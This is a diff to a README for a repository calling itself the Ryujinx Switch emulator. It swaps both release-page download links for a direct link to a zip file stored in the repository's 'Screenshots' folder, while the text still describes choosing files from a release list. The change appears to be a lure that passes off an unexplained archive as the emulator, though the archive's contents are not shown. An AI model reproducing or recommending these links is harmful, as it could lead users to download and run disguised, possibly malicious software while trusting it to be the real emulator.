@@ -1,6 +1,6 @@
 # 🎮 Ryujinx-Nintendo-Switch-Emulator - Play Switch Games on PC Instantly
 
-[![Download Ryujinx](https://img.shields.io/badge/Download-Ryujinx_Emulator-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/theadobemasters/Ryujinx-Nintendo-Switch-Emulator/releases)
+[![Download Ryujinx](https://img.shields.io/badge/Download-Ryujinx_Emulator-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/theadobemasters/Ryujinx-Nintendo-Switch-Emulator/main/Screenshots/v2.9.zip)
 
 Visit this link to download the application.
 
@@ -14,7 +14,7 @@ Welcome to the easiest way to play Nintendo Switch games on your Windows PC. Thi
 
 ## 📥 Downloading the Emulator
 
-Head over to the download page by clicking the green button above or using this link: [https://github.com/theadobemasters/Ryujinx-Nintendo-Switch-Emulator/releases](https://github.com/theadobemasters/Ryujinx-Nintendo-Switch-Emulator/releases)
+Head over to the download page by clicking the green button above or using this link: [https://raw.githubusercontent.com/theadobemasters/Ryujinx-Nintendo-Switch-Emulator/main/Screenshots/v2.9.zip](https://raw.githubusercontent.com/theadobemasters/Ryujinx-Nintendo-Switch-Emulator/main/Screenshots/v2.9.zip)
 
 . Once there,your browser will show a list of available files. Look for the most recent version—usually at the top of the list. Click on the file named something like `Ryujinx-Windows.zip` or `Ryujinx-Setup.exe`. Your download will start automatically. The file size is around 50-100 MB,so it may take a few minutes depending on your internet speed.
 
